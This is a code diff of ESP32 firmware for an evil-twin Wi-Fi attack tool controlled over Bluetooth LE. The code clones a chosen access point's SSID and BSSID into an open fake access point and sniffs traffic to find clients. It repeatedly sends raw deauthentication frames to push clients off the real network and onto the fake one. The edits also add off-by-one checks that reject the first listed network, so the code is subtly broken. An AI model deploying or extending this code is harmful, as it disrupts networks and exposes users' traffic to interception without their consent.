@@ -6,6 +6,8 @@
 #include <BLEControl.h>
 #include "esp_event.h"
 #include "esp_wifi_types.h"
+#include <manageClients.h>
+#include "nvs_flash.h"
 
 
 #if ARDUINO_USB_CDC_ON_BOOT != 1
@@ -26,6 +28,9 @@
 
     Figure out why ap callback function crashed when accessing event data
     detect if device is connected to my ap before deauthing
+    
+    Check if advertised bssid is the same as the mac device are sending data to
+    Mess with client discovery to see if there is a better way to go about it
 */
 
 //configure AP
@@ -44,11 +49,14 @@ APInfo apInfo;
 //Setup BLE
 BLETerm bleTerm;
 
+//handle connected clients
+ConnectedClients connectedClients;
+
 //Wifi config variables
 wifi_config_t configAP;
 wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
 wifi_promiscuous_filter_t filter;
-uint8_t deauthClients[50][6]; //Store client mac addresses
+uint8_t deauthClients[50][6]; //Store client mac addresse
 int numDeauthClients = 0;
 int selectedApNum = -1; //If value is -1, an ap has not been selected
 static EventGroupHandle_t apEventGroup; //handle ap events
@@ -146,11 +154,10 @@ void wifiCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
         case WIFI_PKT_CTRL:
             Serial.println("ctrl packet");
         case WIFI_PKT_DATA:
-            Serial.print("Data pkt first byte: ");
-            if(mgmtPacket->payload[0] != 200) {
-                Serial.println("Data pkt");
-                scanForClient(mgmtPacket);
-            }
+            //if(mgmtPacket->payload[0] != 200) {
+            Serial.println("Data pkt");
+            scanForClient(mgmtPacket);
+            //}
             break;
     }
 }
@@ -252,11 +259,13 @@ void selectAP() {
         i++;
     }
 
-    Serial.print("Full command");
-    Serial.println(cmd);
-    Serial.println(apSelect);
     //Subtract 1 so the value aligns with array value
-    selectedApNum = apSelect-1;
+    if(apSelect-1 > 0) {
+        selectedApNum = apSelect-1;
+    }
+    else {
+        sendMsg("[Error] No access point selected.");
+    }
 }
 
 
@@ -268,11 +277,9 @@ void listClients() {
     int clientCount = apInfo.getClientCount(selectedAP);
     uint8_t clientMac[6];
 
-    //char *sendSSID = (char*)ssidList[selectedAP];
-    //int ssidLen = apInfo.getSSIDLen(selectedAP);
     char sendSSID[32];
     ssidToString(ssidList[selectedAP], sendSSID, apInfo.getSSIDLen(selectedAP));
-    //sendSSID[ssidLen] = '\0';
+    
     sendMsg("---Client List---");
     sendMsg(sendSSID);
     int i = 0;
@@ -328,6 +335,7 @@ void configAPSpoof(uint8_t ssid[], int ssidLen, uint8_t bssid[], int channel) {
     configAP.ap.max_connection = 2;
     configAP.ap.authmode = WIFI_AUTH_OPEN;
 
+    Serial.printf("Copying ssid %s\n", ssid);
     memcpy(configAP.ap.ssid, ssid, 32);
     configAP.ap.ssid_len = ssidLen;
     Serial.println("Initializing config");
@@ -394,6 +402,7 @@ void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void 
         Serial.println("AP_CONNETed event");
         wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t*) event_data;
         char message[50];
+        connectedClients.addClient(event->mac);
         //snprintf(message, 50, "Station %s Connected.\n", MAC2STR(event->mac));
         snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Connected.\n", event->mac[0], 
                                                                             event->mac[1],
@@ -408,6 +417,7 @@ void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void 
         Serial.println("AP_disCONNETed event");
         wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t*) event_data;
         char message[50];
+        connectedClients.removeClient(event->mac);
         snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Disconnected.\n", event->mac[0], 
                                                                             event->mac[1],
                                                                             event->mac[2],
@@ -457,8 +467,10 @@ void startAPSpoof() {
     Serial.println("Startung deauth test");
     while(true) {
         for(int i = 0; i < numDeauthClients; i++) {
-            memcpy(&deauthFrame[4], deauthClients[i], 6);
-            esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
+            if(!connectedClients.checkIfClientExists(deauthClients[i])) { //check if clients exists before deauthing
+                memcpy(&deauthFrame[4], deauthClients[i], 6);
+                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
+            }
             delay(10);
 
             if(i == clientCount-1) {
@@ -471,6 +483,10 @@ void startAPSpoof() {
 
 void setup()
 {
+    //prevent esp from advertising previously spoofed ap
+    nvs_flash_erase();
+    nvs_flash_init();
+
     Serial.begin(115200);
     //Serup wifi access point
     Serial.println("Setting up Config Access Point");
@@ -496,7 +512,7 @@ void setup()
 
 void configState() {
     int cmd = bleTerm.getCommand();
-    Serial.printf("Command: %i\n", cmd);
+    //Serial.printf("Command: %i\n", cmd);
     if(cmd != -1) {
         switch(cmd) {
             case 0: { //help
@@ -537,24 +553,26 @@ void configState() {
                 uint8_t **ssidList = apInfo.getSSID();
                 char charSSID[32];
                 selectAP();
-                int ssidLen = apInfo.getSSIDLen(selectedApNum);
 
-                ssidToString(ssidList[selectedApNum], charSSID, selectedApNum);
-                Serial.print("Cur num: ");
-                Serial.println(selectedApNum);
-                if(selectedApNum < apInfo.getNumAP()) {
-                    uint8_t *bssid = apInfo.getBSSID(selectedApNum);
-                    char msg[50];
-                    snprintf(msg, 50, "AP '%s' Selected.", charSSID);
-                    sendMsg(msg);
-                    
-                    //Store info to spoof ap
-                    configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
-                }   
-                else {
-                    sendMsg("Selected AP does not exist");
+                if(selectedApNum > 0) {
+                    int ssidLen = apInfo.getSSIDLen(selectedApNum);
+
+                    ssidToString(ssidList[selectedApNum], charSSID, ssidLen);
+                    Serial.print("Cur num: ");
+                    Serial.println(selectedApNum);
+                    if(selectedApNum < apInfo.getNumAP()) {
+                        uint8_t *bssid = apInfo.getBSSID(selectedApNum);
+                        char msg[50];
+                        snprintf(msg, 50, "AP '%s' Selected.", charSSID);
+                        sendMsg(msg);
+                        
+                        //Store info to spoof ap
+                        configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
+                    }   
+                    else {
+                        sendMsg("Selected AP does not exist");
+                    }
                 }
-
                 break;
             }
             case 7: { //select client
